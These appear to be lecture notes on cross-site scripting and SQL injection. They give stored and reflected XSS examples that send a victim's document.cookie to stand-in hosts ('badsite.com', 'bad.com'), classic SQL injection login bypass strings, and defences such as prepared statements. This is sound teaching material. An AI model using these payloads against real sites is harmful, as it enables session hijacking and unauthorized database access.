# XSS and SQL injection

## Questions on the readings

The readings today are from
[Computer Security and the Internet](https://people.scs.carleton.ca/~paulv/toolsjewels.html),
[Chapter 9](https://people.scs.carleton.ca/~paulv/toolsjewels/TJrev1/ch9-rev1.pdf),
sections 9.6, 9.7.

## XSS: cross-site scripting

- injecting malicious scripts into HTML tags or web pages

  - rendering the HTML causes the script to be executed

### Stored or persistent XSS

```html
Here is a picture of my dog <img id="mydogpic" src="dog.jpg" />
<script>
  document.getElementById("mydogpic").src =
    "http://badsite.com/dog.jpg?arg1=" + document.cookie;
</script>
```

- input from an attacker is stored on a website (e.g. in a database) without
  being made safe to render and is then retrieved by the victim
- possible on any site that allows users to upload content (e.g. social media,
  discussion forums)
- in the example above, the attacker changes the `src` attribute of the image to
  be a URL that (a) goes to the attacker's site and (b) includes all of the
  user's cookies for the original site
- since images are loaded automatically, when a user visits a page with this
  content, the browser will automatically send that user's cookies to the
  attacker

### Reflected (non-persistent) XSS

```html
Our favorite site for deals is www.good.com: <a href=’http://www.good.com/ <script>document.location="http://bad.com/dog.jpg?arg1="+document.cookie; </script>’> Click here </a>
```

- attacker input is immediately returned, e.g. in an error message or search
  results, without the attacker input being made safe to render
- the example above takes advantage of a site that returns 404 errors with
  `File-not-found: filepath-requested`
- when the user clicks the link, the browser will visit the URL and the good
  site will return a 404 page:

```html
File-not-found:
<script>
  document.location="http://bad.com/
  dog.jpg?arg1=" + document.cookie;
</script>
```

- this sends the user to `bad.com`, and the attacker also gets the user's
  cookies for the good site

### XSS impacts

- once you allow an attacker to inject JavaScript, they can do a lot

  - browser redirection
  - access cookies
  - access browser-stored data for a website
  - rewrite the document being displayed
  - exploit browser vulnerabilities

### Defenses

- sanitize input by removing tags
  - a good framework (e.g. React, Vue) does this for you
- sanitize output by using encoding, e.g. `&lt;` for left angle bracket
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
  - server can specify which domains are allowed to execute scripts

## SQL Injection

- why a vulnerability exists

  - databases store information in tables
  - scripts construct SQL queries
  - scripts use input from cookies, variables, users

- SQL injection

  - crafting input so an attacker chooses an SQL command to be executed

- attack types

  - extracting data from the database
  - modifying the database
  - unauthorized account access
  - denial of service

### Example attacks

- imagine a server constructing a SQL query using input:

```js
query =
  "SELECT * FROM pswdtab WHERE username=’" + un + "’ AND password=’" + pw + "’";
```

- normal use:

```sql
SELECT * FROM pswdtab WHERE username=’sam’ AND password=’abcde’
```

- attacker sends username = `“root’ --”`:

```sql
SELECT * FROM pswdtab WHERE username=’root’ -- AND···
```

- note, `--` indicates a comment, so the rest of the SQL statement is ignored

- attacker sends username = ` “’OR 1=1 --”:

```sql
SELECT * FROM pswdtab WHERE username=’’ OR 1=1 --
```

- note, this provides an OR condition that is always true

### Defenses

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
  recommends prepared statements

  - prepare the query and then give variables to SQL database
  - binding parameters to a SQL query will allow the database to automatically
    handle escaping of characters

- Java example:

```java
// This should REALLY be validated too
String custname = request.getParameter("customerName");
// Perform input validation to detect attacks
String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, custname);
ResultSet results = pstmt.executeQuery( );
```

- Rust example:

```rust
// Input from CLI args but could be anything
let username = std::env::args().last().unwrap();

// Using built-in macros (compile time checks)
let users = sqlx::query_as!(
        User,
        "SELECT * FROM users WHERE name = ?",
        username
    )
    .fetch_all(&pool)
    .await
    .unwrap();

// Using built-in functions
let users: Vec<User> = sqlx::query_as::<_, User>(
        "SELECT * FROM users WHERE name = ?"
    )
    .bind(&username)
    .fetch_all(&pool)
    .await
    .unwrap();
```

- can also use safely-constructed stored procedures, which are similar
